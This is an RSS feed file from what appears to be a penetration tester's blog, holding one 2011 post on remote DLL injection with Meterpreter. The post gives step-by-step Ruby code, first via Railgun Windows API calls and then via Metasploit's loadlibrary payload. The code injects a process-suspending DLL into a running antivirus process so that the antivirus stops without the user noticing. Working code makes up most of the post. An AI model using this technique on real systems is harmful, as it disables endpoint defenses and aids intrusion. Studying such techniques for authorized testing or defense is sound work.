<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Dllinjection on room362com</title>
    <link>//room362.com/categories/dllinjection/</link>
    <description>Recent content in Dllinjection on room362com</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Mon, 30 May 2011 16:35:40 +0000</lastBuildDate>
    <atom:link href="//room362.com/categories/dllinjection/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Remote DLL Injection with Meterpreter</title>
      <link>//room362.com/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
      <pubDate>Mon, 30 May 2011 16:35:40 +0000</pubDate>
      
      <guid>//room362.com/post/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
      <description>&lt;p&gt;Recently Didier Stevens wrote &amp;lsquo;Suspender.dll&amp;rsquo; which is a DLL that will suspend a process and all of it&amp;rsquo;s child processes after a delay. 60 seconds is it&amp;rsquo;s default but you can rename the DLL to add a number (as such &amp;lsquo;Suspender10.dll&amp;rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: &lt;a href=&#34;http://blog.didierstevens.com/2011/04/27/suspender-dll/&#34;&gt;http://blog.didierstevens.com/2011/04/27/suspender-dll/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Jonathan Cran and I had the same idea, as I&amp;rsquo;m sure many others did as well. This might work against AntiVirus setups that protect themselves from being killed or their services stopped.&lt;/p&gt;

&lt;p&gt;I still stand by my original claim that just removing it is easier (&lt;a href=&#34;//room362.com/blog/2010/11/16/silently-uninstall-sep&#34;&gt;Blog Post: Silently Uninstall SEP&lt;/a&gt;). However that might be something the user notices (A little shield disappearing).&lt;/p&gt;

&lt;p&gt;Well, I didn&amp;rsquo;t know how to do this with meterpreter so a bit of google fu landed me on: &lt;a href=&#34;http://www.codeproject.com/KB/threads/winspy.aspx&#34;&gt;http://www.codeproject.com/KB/threads/winspy.aspx&lt;/a&gt; which has 3 different ways to attack the 2nd of which used a DLL (score!)&lt;/p&gt;

&lt;p&gt;Using IRB within a meterpreter shell I started using Railgun (because once you know something sometimes its easy not too look for other solutions)&lt;/p&gt;

&lt;p&gt;I start off setting up some variables after I&amp;rsquo;ve uploaded Suspender.dll:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 1436
sizeofsuspend = 52376
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next up we need to open a handle on the target process:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;handle = client.railgun.kernel32.OpenProcess(PROCESS_ALL_ACCESS,false,pid)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the handle we allocate some memory in the remote process for our DLL to live in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;allocatedmem = client.railgun.kernel32.VirtualAllocEx(handle,nil,sizeofsuspend,MEM_COMMIT,PAGE_READWRITE)[&amp;quot;return&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Writing that DLL to memory isn&amp;rsquo;t much harder: (&lt;em&gt;&lt;strong&gt;this and the previous step is the wrong way to do things as we&amp;rsquo;ll see later&lt;/strong&gt;&lt;/em&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.WriteProcessMemory(handle,allocatedmem,pathtosuspend,sizeofsuspend,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here is the hard part. We have to somehow figure out the address LoadLibraryA in the remote processes memory space, accounting for ASLR then pass it the location in memory where our DLL is hiding. Yah, I couldn&amp;rsquo;t figure this one out, here is the best I did:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.kernel32.CreateRemoteThread(handle,nil,0,allocatedmem,pathtosuspend,0,nil)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then I got a friendly reminder by HD that most of this was built into meterpreter already so all that railgun nastness boils down to someting a lot simpler. Set the variables again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pid = 1436
pathtosuspend = &amp;quot;C:\Docume~1\Administrator\Desktop\Suspender10.dll&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But this time we are going to use the loadlibrary payload that just got added to Metasploit Framework in &lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/12765&#34;&gt;r12765&lt;/a&gt;. We generate the payload with it pointing at our Suspender DLL:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
pay.datastore[&#39;DLL&#39;] = pathtosuspend
pay.datastore[&#39;EXITFUNC&#39;] = &#39;thread&#39;
raw = pay.generate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Open the process, this time with Rex:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Allocate the memory in the remote process write the payload (not our DLL) into that space:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
targetprocess.memory.write(mem, raw)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally create the remote thread.. MUCH easier (The power of Rex even over Railgun)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;targetprocess.thread.create(mem, 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And 10 seconds later our AV and all it&amp;rsquo;s children processes stop. Suspended by Didier&amp;rsquo;s Suspender.DLL. Thanks to HD for the slap in the head that I was doing things the wrong way and the 1 AM update to the framework that made this possible.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>